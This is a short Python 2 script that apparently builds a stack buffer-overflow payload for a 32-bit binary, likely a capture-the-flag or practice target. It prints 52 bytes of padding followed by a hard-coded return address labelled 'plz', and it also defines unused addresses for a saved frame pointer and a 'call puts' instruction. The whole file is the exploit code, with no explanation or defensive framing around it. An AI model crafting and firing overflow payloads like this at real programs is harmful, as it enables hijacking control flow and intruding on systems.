#! /usr/bin/python

ebp = '\xb8\xd5\xff\xff'
puts_addr = '\x37\x86\x04\x08'      # call puts
plz_addr = '\xa6\x86\x04\x08'       # plz ...


print "G" * 52 + plz_addr

